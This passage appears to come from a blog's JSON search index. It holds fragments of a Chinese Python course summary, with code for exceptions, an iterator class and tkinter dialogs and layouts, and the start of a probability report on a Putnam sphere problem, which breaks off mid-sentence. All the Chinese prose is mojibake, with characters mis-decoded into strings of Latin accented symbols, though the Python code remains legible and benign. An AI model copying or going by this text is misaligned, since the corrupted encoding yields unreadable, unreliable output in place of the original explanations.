é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆ next() å¯ä»¥è¿”å›ç”Ÿæˆå™¨ç”Ÿæˆçš„ä¸‹ä¸€ä¸ªå…ƒç´ å‘¢ï¼Ÿé€šè¿‡æŸ¥é˜…æ–‡æ¡£å‘ç°ï¼Œnext() çš„å‚æ•°éœ€è¦æ˜¯ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ã€‚å› æ­¤æˆ‘ä»¬çŸ¥é“ï¼Œç”Ÿæˆå™¨æ˜¯ä¸€ç§è¿­ä»£å™¨ã€‚ ç„¶è€Œï¼Œisinstance([], Iterator) è¯­å¥çš„ç»“æœå´æ˜¯ Falseï¼Œæ„å‘³ç€åˆ—è¡¨ï¼ˆå­—å…¸ã€å­—ç¬¦ä¸²ï¼‰å¹¶ä¸æ˜¯è¿­ä»£å™¨å¯¹è±¡ï¼Œå°½ç®¡å¯ä»¥ç”¨ iter() è¿›è¡Œå¼ºåˆ¶è½¬æ¢ã€‚è¿™æ­ç¤ºäº†è¿­ä»£å™¨å¯¹è±¡ä½œä¸ºæµå¯¹è±¡çš„æœ€å¤§ä¼˜ç‚¹ï¼Œå³æƒ°æ€§è®¡ç®—ã€‚ åŒæ—¶ï¼Œè¿­ä»£å™¨è¿­ä»£å®Œæ¯•åï¼Œæˆ‘ä»¬æ³¨æ„åˆ° Python è§£é‡Šå™¨ä¼šæŠ›å‡º StopIteration çš„é”™è¯¯ã€‚è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„å¼‚å¸¸ï¼Œè€Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯å¤„ç†è¿™ä¸€å¼‚å¸¸ã€‚å¼‚å¸¸å¤„ç†è¯­æ³•æœ‰ç‚¹ç±»ä¼¼ Javaï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ä¸€ä¸ªå¸¸è§„çš„æ–‡ä»¶å¤„ç†ï¼ˆè¿™é‡Œæ²¡æœ‰ä»‹ç»ï¼Œå› ä¸ºæ¯”è¾ƒç®€å•ï¼Œè€Œä¸”å’Œ C++ å¤ªç›¸ä¼¼äº†ï¼‰çš„ä¾‹å­æ¥è¯´æ˜ï¼š import sys import time f = None try: f = open(\"poem.txt\") while True: line = f.readline() if len(line) == 0: break print(line, end='') sys.stdout.flush() print(\"Press ctrl+c now\") time.sleep(2) except IOError: print(\"Could not find file poem.txt\") except KeyboardInterrupt: print(\"!! You cancelled the reading from the file.\") finally: if f: f.close() print(\"(Cleaning up: Closed the file)\") # Or use instead: with open(\"poem.txt\") as f: for line in f: print(line, end='') è¿™é‡Œå°†å¯èƒ½äº§ç”Ÿå¼‚å¸¸çš„ä»£ç å—æ”¾åœ¨äº† try: åé¢ï¼Œå¹¶åœ¨ except: åæ•è·å¹¶å¤„ç†å¼‚å¸¸ï¼Œfinally: è¿›è¡Œå–„åå·¥ä½œã€‚å¦ä¸€ç§æ–¹æ¡ˆæ˜¯ç”¨ with...as... è¯­å¥æ¥ç®€åŒ–èµ„æºçš„è·å–ä¸é‡Šæ”¾ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±å®šä¹‰ä¸€ç§å¼‚å¸¸ï¼Œå¹¶åœ¨ try: è¯­å¥å—ä¸­ç”¨ raise å¼‚å¸¸å æŠ›å‡ºå¼‚å¸¸ã€‚è¿™é‡Œå°±éœ€è¦æˆ‘ä»¬å®šä¹‰ä¸€ç§å¼‚å¸¸ç±»ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ã€‚äºæ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥å­¦ä¹ äº†é¢å‘å¯¹è±¡ç¼–ç¨‹ã€‚ å¯¹äºé¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ï¼Œç»è¿‡ C++ ä¸ Java ä¸¤é—¨è¯­è¨€çš„å­¦ä¹ ï¼Œæˆ‘å†ç†Ÿæ‚‰ä¸è¿‡äº†ï¼Œå› æ­¤è®¸å¤š OOP ä¸­é‡è¦çš„æ¦‚å¿µï¼Œå¦‚å°è£…ã€ç»§æ‰¿ã€å¤šæ€ç­‰è¿™é‡Œä¸ä¼šå†èµ˜è¿°ã€‚ åœ¨ä»»ä½•ç±»çš„å¯¹è±¡æ–¹æ³•çš„å‚æ•°åˆ—è¡¨å¼€å¤´éƒ½ä¼šæœ‰ä¸€ä¸ª self å‚æ•°ï¼Œå¼•ç”¨å¯¹è±¡æœ¬èº«ï¼Œä½œç”¨ç›¸å½“äº this æŒ‡é’ˆï¼› ç±»çš„æ„é€ å‡½æ•°åç§°ä¸º __init__ï¼› ç§æœ‰å˜é‡ä»¥ __ å¼€å¤´ï¼ˆä½†æ˜¯ä¸èƒ½ä»¥ __ ç»“å°¾ï¼ï¼‰ï¼Œä»å¤–éƒ¨è®¿é—®è¿™ä¸€å˜é‡åªä¼šæ–°å¢ä¸€ä¸ªåŒåå˜é‡ï¼›æœ¬è´¨ï¼šName-mangling ç»§æ‰¿ï¼šclass æ´¾ç”Ÿç±» (åŸºç±»):ï¼›ç»§æ‰¿å…ƒç»„ä¸­ä¹Ÿå¯ä»¥æœ‰å¤šä¸ªåŸºç±»ï¼Œå³å¤šé‡ç»§æ‰¿ï¼› æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯è™šæ‹Ÿçš„ï¼ˆC++ virtual å…³é”®å­—ï¼‰ï¼› type(å¯¹è±¡) è¿”å›å¯¹è±¡ç±»å‹ï¼›isinstance() å¯¹äºç»§æ‰¿çš„ç±»æ›´æ–¹ä¾¿ï¼›dir() è·å–ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼› å¯ä»¥å®šä¹‰ç±»å±æ€§å’Œç±»æ–¹æ³•ï¼Œåè€…éœ€è¦è£…é¥°å™¨ï¼ˆä¸åœ¨è¯¾ç¨‹èŒƒå›´å†…ï¼‰@classmethod æœ€åä»¥ä¸€ä¸ªç®€å•çš„ä¾‹å­ç»“æŸ OOP éƒ¨åˆ†ï¼š class Fib: def __init__(self): self.prev = 0 self.curr = 1 def __iter__(self): return self def __next__(self): val = self.curr self.curr += self.prev self.prev = val if self.prev \u003e 2000: raise StopIteration return val f = Fib() for i in f: print(i, end=' ') æœ€åä¸€ç‚¹é¢å¤–çš„å†…å®¹æ˜¯åŒ¿åå‡½æ•°ï¼Œç®€å•æ¥è¯´å°±æ˜¯ lambda å‚æ•°: è¡¨è¾¾å¼ çš„å½¢å¼ï¼Œå…¶ä¸­ â€œå‚æ•°â€ å¯é€‰ï¼Œâ€œè¡¨è¾¾å¼â€å³è¿”å›å€¼ã€‚å¦å¤–ï¼Œlambda è¡¨è¾¾å¼æœ¬èº«ä¹Ÿå¯ä»¥ä½œä¸ºå‡½æ•°çš„è¿”å›å€¼ã€‚ ","date":"2019-01-06","objectID":"/python-summary/:3:0","tags":["é¡¹ç›®","Python"],"title":"ã€ŠPython ç¼–ç¨‹æŠ€æœ¯ã€‹æœŸæœ«ä½œä¸š","uri":"/python-summary/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å›¾å½¢åŒ–ç¼–ç¨‹ åœ¨è¯¾ç¨‹æœ€åæˆ‘ä»¬å­¦ä¹ äº†åŸºäº tkinter çš„å›¾å½¢åŒ–ç¼–ç¨‹, ä¸ºæ­¤æˆ‘ä»¬éœ€è¦ import tkinter æ¨¡å—ã€‚ä»ä¸€ä¸ªç®€å•çš„ä¾‹å­å¼€å§‹ï¼š from tkinter import * def showPosEvent(event): print('Widget=%sX=%sY=%s' % (event.widget, event.x, event.y)) def onLeftClick(event): print('Got left mouse button click:', end='') showPosEvent(event) tkroot = Tk() labelfont = ('courier', 20, 'bold') widget = Label(tkroot, text='Hello bind world') widget.config(bg='red', font=labelfont) widget.config(height=5, width=20) widget.pack(expand=YES, fill=BOTH) widget.bind('\u003cButton-1\u003e', onLeftClick) widget.focus() tkroot.title('Click Me') tkroot.mainloop() æˆ‘ä»¬ç”¨ Tk åˆ›å»ºä¸»çª—ä½“ï¼ŒLabel åˆ›å»ºä¸€ä¸ªæ ‡ç­¾ï¼Œé€šè¿‡å…¶ config æ–¹æ³•è®¾ç½®å„ç§å±æ€§åï¼Œç”¨ pack æ–¹æ³•è£…å…¥ä¸»çª—ä½“ä¸­ã€‚ ä¸ºäº†è®©æ§ä»¶èƒ½å“åº”äº‹ä»¶ï¼Œä½¿ç”¨ bind æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºäº‹ä»¶ç±»å‹ï¼Œå¯ä»¥æœ‰ \u003cButton-1\u003e(é¼ æ ‡å·¦é”®), \u003cButton-2\u003e(é¼ æ ‡ä¸­é”®), \u003cButton-3\u003e(é¼ æ ‡å³é”®), \u003cDouble-1\u003e(å·¦é”®åŒå‡»), \u003cB1-Motion\u003e(å·¦é”®æ‹–åŠ¨), \u003cKey-Press\u003e, \u003cUp\u003e, \u003cReturn\u003e ç­‰ç­‰; ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ£€æµ‹åˆ°äº‹ä»¶å‘ç”Ÿæ—¶çš„è¡Œä¸ºï¼Œç”¨ä¸€ä¸ªå‡½æ•°åè¡¨ç¤ºï¼ˆç±»ä¼¼ Java çš„ EventListenerï¼‰ã€‚è¯¥å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ª event å¯¹è±¡ï¼Œå…¶å±æ€§ widget è¡¨ç¤ºäº‹ä»¶ä½œç”¨çš„æ§ä»¶ï¼Œx å’Œ y è¡¨ç¤ºåæ ‡ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚ æœ€åï¼Œè¿™é‡Œç”¨ focus æ–¹æ³•è®¾ç½®ç„¦ç‚¹ï¼Œmainloop ä½¿çª—ä½“å¼€å§‹å¾ªç¯ç­‰å¾…ï¼Œä¹Ÿå°±æ˜¯çœŸæ­£è¿è¡Œèµ·æ¥ã€‚è¿è¡Œæ•ˆæœï¼š å›¾ 3 \" å›¾ 3 è¿™é‡Œç”¨çš„æ§ä»¶æ˜¯ Labelï¼Œå¯¹äºå…¶å®ƒæ§ä»¶åŒç†ï¼Œå¦‚ Button, Frame, Entry, Checkbutton, Radiobutton, Scale ç­‰ç­‰ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œtkinter ä¹Ÿæä¾›äº†ä¸€äº›å°è£…å¥½çš„å¯¹è¯æ¡†ä¾›æˆ‘ä»¬è°ƒç”¨ã€‚ä¾‹å¦‚ï¼š from tkinter.filedialog import askopenfilename from tkinter.colorchooser import askcolor from tkinter.messagebox import askquestion, showerror from tkinter.simpledialog import askfloat from tkinter import * demos = { 'Open': askopenfilename, 'Color': askcolor, 'Query': lambda: askquestion('Warning', 'You typed\"rm *\"\\nConfirm?'), 'Error': lambda: showerror('Error!', \"He's dead, Jim\"), 'Input': lambda: askfloat('Entry', 'Enter credit card number') } class Demo(Frame): def __init__(self, parent=None, **options): Frame.__init__(self, parent, **options) self.pack() Label(self, text=\"Basic demos\").pack() for (key, value) in demos.items(): Button(self, text=key, command=value).pack(side=TOP, fill=BOTH) if __name__ == '__main__': Demo().mainloop() ç‚¹å‡» Open æŒ‰é’®ï¼Œä¼šå‡ºç°æ–‡ä»¶é€‰æ‹©çš„å¯¹è¯æ¡†ï¼›Color åˆ™å¯¹åº”é¢œè‰²é€‰æ‹©å¯¹è¯æ¡†ï¼›Query å¯¹åº”æ¶ˆæ¯æç¤ºæ¡† (å¸¦é—®å· + æ˜¯ / å¦é€‰é¡¹)ï¼›Error å‡ºç°é”™è¯¯æç¤ºæ¡†ï¼›Input åˆ™å¼¹å‡ºå¸¦æ–‡æœ¬æ¡†çš„å¯¹è¯æ¡†ï¼Œå…è®¸ç”¨æˆ·è¿›è¡Œè¾“å…¥ã€‚ ä»è¿™ä¸ªä¾‹å­æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°ï¼Œtkinter å’Œé¢å‘å¯¹è±¡çš„ç»“åˆåŒæ ·ååˆ†ä¾¿æ·ã€‚è¿ç”¨è¿™ç§é¢å‘å¯¹è±¡çš„æ€æƒ³ï¼Œæˆ‘ä»¬å®ç°ä¸€ä¸ªæŒ‰é’®ç±»ï¼Œç”¨äºåœ¨é€€å‡ºæ—¶å¼¹å‡ºç¡®è®¤å¯¹è¯æ¡†ï¼š from tkinter import * from tkinter.messagebox import askokcancel class Quitter(Frame): def __init__(self, parent=None): Frame.__init__(self, parent) self.pack() widget = Button(self, text='Quit', command=self.quit) widget.pack(side=LEFT, expand=YES, fill=BOTH) def quit(self): ans = askokcancel('Verify exit', \"Really quit?\") if ans: quit() if __name__ == '__main__': Quitter().mainloop() æ­¤å¤–ï¼Œé™¤äº†ç”¨ä¸Šé¢æåˆ°çš„ pack æ–¹æ³•å¯ä»¥ç®¡ç†æ§ä»¶å¸ƒå±€å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ grid å¸ƒå±€ç®¡ç†å™¨ã€‚å®ƒå°†æ§ä»¶æ”¾ç½®åˆ°ä¸€ä¸ªäºŒç»´çš„è¡¨æ ¼é‡Œï¼Œä¸»æ§ä»¶è¢«åˆ†å‰²æˆä¸€ç³»åˆ—çš„è¡Œå’Œåˆ—ï¼Œè¡¨æ ¼ä¸­çš„æ¯ä¸ªå•å…ƒï¼ˆcellï¼‰éƒ½å¯ä»¥æ”¾ç½®ä¸€ä¸ªæ§ä»¶ã€‚ä¾‹å¦‚ï¼š from tkinter import * master = Tk() Label(master, text=\"First\").grid(row=0,column=0, sticky=W) Label(master, text=\"Second\").grid(row=1,column=0, sticky=W) e1 = Entry(master) e2 = Entry(master) e1.grid(row=0, column=1,sticky=(E, S)) e2.grid(row=1, column=1,sticky=(E, S)) master.mainloop() æ•ˆæœï¼š å›¾ 4 \" å›¾ 4 éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œpack å¸ƒå±€ç®¡ç†å™¨ä¸ grid å¸ƒå±€ç®¡ç†å™¨ä¸åº”åœ¨ä¸€ä¸ªçª—å£ä¸­æ··åˆä½¿ç”¨ã€‚ å¦‚æœæˆ‘ä»¬æƒ³åœ¨çª—ä½“ä¸­æ˜¾ç¤ºå›¾ç‰‡ä¹ŸåŒæ ·å¯è¡Œã€‚è¿™éœ€è¦ç”¨åˆ° Canvas å¯¹è±¡ï¼š picdir = \"pic.gif\" from tkinter import * win = Tk() img = PhotoImage(file=picdir) can = Canvas(win) can.pack(fill=BOTH) can.create_image(20, 20, image=img, anchor=NW) win.mainloop() è¿™æ˜¯æœ€ç®€å•çš„åœ¨çª—ä½“ä¸­æ˜¾ç¤ºä¸€å¼ å›¾ç‰‡çš„æ–¹æ³•ï¼ŒåŒæ ·æˆ‘ä»¬å¯ä»¥ç»™ Button çš„ img å±æ€§èµ‹å€¼æ¥åœ¨æŒ‰é’®ä¸Šæ˜¾ç¤ºå›¾ç‰‡ã€‚ æ‰€è°“ Canvas å¯¹è±¡ï¼Œå³ç”»å¸ƒå¯¹è±¡ï¼Œå…¶åŠŸèƒ½è¿œä¸æ­¢äºç»˜åˆ¶ä¸€å¼ å·²æœ‰çš„å›¾ç‰‡ã€‚å®ƒä¸ä»…æ‹¥æœ‰å…¶å®ƒæ§ä»¶ç±»ä¼¼çš„å±æ€§ä¸æ–¹æ³•ï¼Œè¿˜æœ‰è‡ªå¸¦çš„è®¸å¤šç»˜å›¾æ–¹æ³•ï¼Œå¦‚ create_line, create_oval, create_rectangle, create_arc, create_image, create_text, create_window ç­‰ã€‚æ ¹æ®å…¶å‚æ•°åˆ—è¡¨ä¼ å…¥é€‚å½“çš„å‚æ•°ï¼Œå¯ä»¥å®Œæˆå¤§éƒ¨åˆ†åŸºæœ¬çš„ç»˜å›¾åŠŸèƒ½ã€‚ç»“åˆå‰é¢æåˆ°çš„é¼ æ ‡æ‹–åŠ¨äº‹ä»¶ä¸é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œå®Œå…¨å¯ä»¥è®©ç”¨æˆ·è‡ªå·±åœ¨çª—ä½“å†…åˆ›ä½œå›¾åƒã€‚ tkinter åŒæ ·æ”¯æŒ listbox æ§ä»¶ï¼Œä¸‹æ‹‰èœå•ä¸çª—ä½“èœå•ï¼Œå¸¦æ»šåŠ¨æ¡çš„æ–‡æœ¬æ¡†ç­‰ç­‰, ä»–ä»¬çš„æ–¹æ³•å¤šæ ·ï¼Œä½†ä¹Ÿæœ‰è®¸å¤šç›¸ä¼¼ä¹‹å¤„ã€‚ä¸‹é¢æ˜¯ä¸¤ä¸ªç®€å•çš„ç¤ºä¾‹ï¼š å›¾ 5 \" å›¾ 5 å›¾ 6 \" å›¾ 6 ç¬¬ä¸€ä¸ªæ˜¯èœå•æ çš„æµ‹è¯•ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸€ä¸ªç®€å•çš„æ–‡æœ¬ç¼–è¾‘å™¨ã€‚ åˆ°è¿™é‡Œï¼Œè¿™é—¨è¯¾ç¨‹çš„å†…å®¹å·®ä¸å¤šç»“æŸäº†ã€‚ç„¶è€Œ Python çš„åŠŸèƒ½è¿œè¿œä¸æ­¢è¿™äº›ï¼Œè¯¾ç¨‹çš„ç»“æŸä¹Ÿå¹¶ä¸æ„å‘³ç€ Python å­¦ä¹ çš„ç»“æŸã€‚åœ¨å­¦ä¹ å®Œè¯¾ç¨‹ä¹‹åï¼Œæˆ‘åˆå°è¯•å†™äº†åŸºäº Python çš„çˆ¬è™«â€”â€”æ ¹æ®è±†ç“£ç”µå½±æ’è¡Œæ¥è‡ªåŠ¨æ¨èç”µå½±ï¼Œå¹¶é€šè¿‡å¾®ä¿¡è‡ªåŠ¨å›å¤çš„æ¥å£å®ç°äº¤äº’ã€‚ é¡¹ç›®åœ°å€ï¼šhttps://github.com/SignorMercurio/WechatFilmRecommender ","date":"2019-01-06","objectID":"/python-summary/:4:0","tags":["é¡¹ç›®","Python"],"title":"ã€ŠPython ç¼–ç¨‹æŠ€æœ¯ã€‹æœŸæœ«ä½œä¸š","uri":"/python-summary/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å‚è€ƒèµ„æ–™ Python æ•™ç¨‹ - å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ ç®€æ˜ Python æ•™ç¨‹ æ•™å­¦è¯¾ä»¶ ","date":"2019-01-06","objectID":"/python-summary/:5:0","tags":["é¡¹ç›®","Python"],"title":"ã€ŠPython ç¼–ç¨‹æŠ€æœ¯ã€‹æœŸæœ«ä½œä¸š","uri":"/python-summary/"},{"categories":["æ¢ç´¢"],"content":"ä¸€é“æ•°ç«å‹è½´é¢˜çš„ç›´è§‚è§£æ³•ã€‚ ","date":"2018-12-14","objectID":"/probability-report/:0:0","tags":["æ•°å­¦"],"title":"æ¦‚ç‡è®ºè¯¾ç¨‹æŠ¥å‘Š","uri":"/probability-report/"},{"categories":["æ¢ç´¢"],"content":"èƒŒæ™¯ è¿™ç¯‡æŠ¥å‘Šçš„çµæ„Ÿæ¥æºäºä¸€é“ 1992 å¹´æ™®ç‰¹å—æ•°å­¦ç«èµ›çœŸé¢˜ï¼ŒåŸé¢˜çš„è¡¨è¿°å¦‚ä¸‹ï¼š Aâ€“6 Four points are chosen at random on the surface of a sphere. What is the probability that the center of the sphere lies inside the tetrahedron whose vertices are at the four points? (It is understood that each point is independently chosen relative to a uniform distribution on the sphere.) é¢˜ç›®å¤§æ„ï¼šåœ¨çƒé¢ä¸Šéšæœºé€‰æ‹©å››ä¸ªç‚¹æ„æˆå››é¢ä½“ï¼Œæ±‚çƒå¿ƒè½åœ¨è¯¥å››é¢ä½“å†…ï¼ˆå«è¾¹ç•Œï¼‰çš„æ¦‚ç‡ã€‚ ","date":"2018-12-14","objectID":"/probability-report/:1:0","tags":["æ•°å­¦"],"title":"æ¦‚ç‡è®ºè¯¾ç¨‹æŠ¥å‘Š","uri":"/probability-report/"},{"categories":["æ¢ç´¢"],"content":"åˆæ­¥æ€è·¯ ","date":"2018-12-14","objectID":"/probability-report/:2:0","tags":["æ•°å­¦"],"title":"æ¦‚ç‡è®ºè¯¾ç¨‹æŠ¥å‘Š","uri":"/probability-report/"},{"categories":["æ¢ç´¢"],"content":"å‡å°è§„æ¨¡ å¯¹äºè¿™ç±»ç©ºé—´å‡ ä½•é—®é¢˜ï¼Œå®¹æ˜“æƒ³åˆ°é€šè¿‡ â€œé™ç»´å¤„ç†â€ æ¥é™ä½æ€ç»´éš¾åº¦ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¸å¦¨è€ƒè™‘å¦‚ä¸‹é—®é¢˜ï¼š åœ¨åœ†ä¸Šä»»å–ä¸‰ä¸ªç‚¹æ„æˆä¸‰è§’å½¢ï¼Œæ±‚åœ†å¿ƒè½åœ¨è¯¥ä¸‰è§’å½¢å†…ï¼ˆå«è¾¹ç•Œï¼‰çš„æ¦‚ç‡ã€‚ è¿™é‡Œæˆ‘ä»¬å†æ¬¡é™ä½é—®é¢˜çš„è§„æ¨¡ï¼šå‡è®¾ä¸‰ä¸ªç‚¹åˆ†åˆ«ä¸º P1,P2,P3ï¼Œå›ºå®š P1,P2 ä¸¤ç‚¹ï¼Œå†åœ¨åœ†ä¸Šéšæœºå–ä¸€ç‚¹ P3ã€‚æ”¹å˜ P3 çš„ä½ç½®ï¼Œå¯ä»¥å‘ç°ï¼Œå½“ä¸”ä»…å½“ P3 åœ¨ä¸€æ®µç‰¹å®šçš„å¼§ä¸Šæ—¶ï¼Œåœ†å¿ƒåœ¨ä¸‰è§’å½¢å†…ï¼Œè€Œè¿™æ®µå¼§çš„é•¿åº¦ä¸åœ†çš„å‘¨é•¿çš„æ¯”å€¼å³ä¸ºäºŒç»´æƒ…å†µä¸‹çš„çš„ç­”æ¡ˆã€‚ è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸Šä¸€æ®µæœ€åä¸€å¥è¯çœ‹ä¼¼æ˜¯ä¸€ä¸ªæ˜¾ç„¶çš„ç»“è®ºï¼Œå®é™…ä¸Šå´æš—è—ç„æœºã€‚æˆ‘ä»¬è®¤ä¸ºï¼ŒP3 èƒ½å¤Ÿå–çš„æ‰€æœ‰ç‚¹çš„é›†åˆâ€”â€”ä¹Ÿå°±æ˜¯è¿™æ®µç‰¹å®šçš„å¼§ï¼Œçš„é•¿åº¦å åœ†å‘¨é•¿çš„æ¯”ä¾‹å°±æ˜¯è¦æ±‚çš„æ¦‚ç‡ï¼Œè€Œè¿™ä¸ªå‘½é¢˜æˆç«‹çš„å‰ææ˜¯ï¼šä¸‰è§’å½¢çš„é¡¶ç‚¹åœ¨åœ†ä¸Šæ˜¯å‡åŒ€åˆ†å¸ƒçš„ã€‚è¿™çœ‹èµ·æ¥åŒæ ·å¾ˆæ˜¾ç„¶ï¼Œä¸è¿‡è¿™ä¸ªç­‰å¯èƒ½æ€§å‡è®¾ä¼šå†³å®šæ ·æœ¬ç©ºé—´çš„å¤§å°ï¼Œæœ‰æ—¶ç”šè‡³èƒ½å½±å“ç»“æœçš„æ­£ç¡®æ€§ï¼ è¿™æé†’æˆ‘ä»¬ï¼Œæ¦‚ç‡è®ºå¹¶ä¸åƒè¡¨é¢çœ‹ä¸Šå»é‚£æ ·ï¼Œæ˜¯åœ¨å•çº¯ç›´è§‚åœ°è®¡ç®—äº‹ä»¶å‘ç”Ÿçš„æ¦‚ç‡â€”â€”å¯¹æ ·æœ¬ç©ºé—´çš„ä¸¥è°¨å®šä¹‰å¸¸å¸¸è¢«äººå¿½è§†ã€‚å®é™…ä¸Šï¼Œåœ¨ä¸Šä¸–çºªåˆæ³•å›½æ•°å­¦å®¶è´ç‰¹éƒå·²ç»æå‡ºäº† â€œè´ç‰¹éƒå¥‡è®ºâ€ï¼Œç”¨ä¸åŒçš„ç­‰å¯èƒ½æ€§å‡è®¾è®¡ç®—å‡ºåŒä¸€ä¸ªé—®é¢˜çš„ä¸‰ä¸ª â€œæ­£ç¡®ç­”æ¡ˆâ€ï¼Œæ¨åŠ¨äº†æ¦‚ç‡è®ºå‘å…¬ç†åŒ–çš„æ–¹å‘å‘å±•ã€‚ å›åˆ°æ­£é¢˜ï¼Œæ˜¾ç„¶å¼§é•¿ä¸ P1,P2 çš„é€‰æ‹©æœ‰å…³ã€‚åˆ†åˆ«è¿‡ P1,P2 ä»¥åŠåœ†å¿ƒä½œç›´çº¿ï¼Œé‚£ä¹ˆè¿™ä¸¤æ¡ç›´çº¿å°†æŠŠåœ†åˆ†æˆå››æ®µå¼§ã€‚P1,P2 ç›¸å¯¹çš„é‚£æ®µå¼§çš„é•¿åº¦å³ä¸ºæ‰€æ±‚ã€‚ä¸ºäº†æ±‚å‡ºè¿™æ®µå¼§çš„å¹³å‡é•¿åº¦ï¼Œæˆ‘ä»¬è€ƒè™‘ä¸¤ç§æé™æƒ…å†µï¼šï¼ˆ1ï¼‰P1,P2 é‡åˆï¼Œè¯¥å¼§é•¿ç­‰äº 0ï¼›ï¼ˆ2ï¼‰P1,P2 ä½äºåœ†ä¸¤ç«¯ï¼ˆå³ P1P2 ä¸ºåœ†çš„ä¸€æ¡ç›´å¾„ï¼‰ï¼Œè¯¥å¼§é•¿ç­‰äºåœ†çš„åŠå‘¨é•¿ã€‚åˆå› ä¸º P1,P2 çš„é€‰å–æ˜¯ä»»æ„çš„ï¼Œæé™æƒ…å†µçš„å‡å€¼ï¼Œä¹Ÿå°±æ˜¯ 1/4 å‘¨é•¿ï¼Œå°±æ˜¯è¿™æ®µå¼§é•¿çš„å¹³å‡å€¼ã€‚æˆ‘ä»¬å¾—åˆ°ï¼ŒäºŒç»´æƒ…å†µä¸‹çš„ç­”æ¡ˆä¸º 1/4ã€‚ åŒæ ·åœ°ï¼Œè¿™é‡Œå–ï¼ˆæœ€å¤§å€¼ + æœ€å°å€¼ï¼‰çš„å‡å€¼ä¹Ÿæ˜¯å› ä¸ºï¼Œæˆ‘ä»¬å·²ç»å‡å®š P1,P2 åœ¨åœ†ä¸Šå‡åŒ€åˆ†å¸ƒâ€”â€”å› æ­¤å¼§é•¿åœ¨ 0 åˆ°åŠå‘¨é•¿ä¹Ÿæ˜¯å‡åŒ€åˆ†å¸ƒçš„ã€‚äºæ˜¯æˆ‘ä»¬æ±‚å‡ºå¼§çš„å¹³å‡é•¿åº¦ï¼Œå®é™…ä¸Šå°±æ˜¯æ±‚å‡ºäº†åœ†å¿ƒè½åœ¨ä¸‰è§’å½¢å†…ï¼ˆå«è¾¹ç•Œï¼‰çš„æ¦‚ç‡æœŸæœ›ã€‚ ","date":"2018-12-14","objectID":"/probability-report/:2:1","tags":["æ•°å­¦"],"title":"æ¦‚ç‡è®ºè¯¾ç¨‹æŠ¥å‘Š","uri":"/probability-report/"},{"categories":["æ¢ç´¢"],"content":"æ¨å¹¿ æ¨å¹¿åˆ°ä¸‰ç»´ï¼Œå‡è®¾å››ä¸ªç‚¹åˆ†åˆ«ä¸º P1,P2,P3,P4ï¼Œæˆ‘ä»¬å›ºå®š P1,P2,P3 ç‚¹ï¼Œå¹¶ä¸”åˆ†åˆ«è¿‡ P1,P2,P3 ä»¥åŠçƒå¿ƒä½œç›´çº¿ï¼Œè¿™äº›ç›´çº¿ä¸¤ä¸¤å†³å®šä¸€ä¸ªå¹³é¢ã€‚ç”»å‡ºå›¾åƒåå¯ä»¥çœ‹åˆ°ï¼Œçƒé¢è¢«å¹³é¢åˆ†ä¸ºäº† 8 ä¸ªåŒºåŸŸï¼Œè€Œ P4 éœ€è¦è½åœ¨ P1,P2,P3 ç›¸å¯¹çš„é‚£ä¸ªåŒºåŸŸé‡Œã€‚ ç„¶è€Œï¼Œæœ‰åˆ«äºäºŒç»´æƒ…å†µï¼Œè®© P1,P2,P3 å˜åŒ–å¹¶è®¾æ³•æ±‚å‡ºé‚£å—åŒºåŸŸçš„å¹³å‡é¢ç§¯æ˜¯ååˆ†å›°éš¾çš„ã€‚ä¹Ÿè®¸å¯ä»¥å€ŸåŠ©æ›²é¢ç§¯åˆ†è§£å†³ï¼Œä½†æ­¥éª¤å°†ååˆ†ç¹çã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å˜æ¢æ€è·¯ã€‚ ","date":"2018-12-14","objectID":"/probability-report/:2:2","tags":["æ•°å­¦"],"title":"æ¦‚ç‡è®ºè¯¾ç¨‹æŠ¥å‘Š","uri":"/probability-report/"},{"categories":["æ¢ç´¢"],"content":"å˜æ¢æ€è·¯ ","date":"2018-12-14","objectID":"/probability-report/:3:0","tags":["æ•°å­¦"],"title":"æ¦‚ç‡è®ºè¯¾ç¨‹æŠ¥å‘Š","uri":"/probability-report/"},{"categories":["æ¢ç´¢"],"content":"ä½ç»´æƒ…å†µå¦è§£ å›åˆ°äºŒç»´çš„æƒ…å†µï¼Œæ—¢ç„¶åˆšæ‰çš„æ–¹æ³•æ¨å¹¿æ—¶é‡åˆ°äº†å›°éš¾ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½æ¢ä¸€ç§æ›´å®¹æ˜“æ¨å¹¿çš„æ–¹æ³•å‘¢ï¼Ÿè¿™éœ€è¦å¯¹é—®é¢˜ä½œè¿›ä¸€æ­¥çš„ç®€åŒ–ã€‚ è€ƒè™‘åˆšæ‰çš„è§£æ³•ä¸­çš„æ ¸å¿ƒå…ƒç´ ï¼šæ–°å¢çš„ä¸¤æ¡è¾…åŠ©çº¿ã€‚ç”±äºè¿™ä¸¤æ¡è¾…åŠ©çº¿ç®€åŒ–äº†é—®é¢˜ï¼Œæˆ‘ä»¬å°è¯•å°†é—®é¢˜åªç”¨è¿™äº›æ–°å¢çš„å…ƒç´ 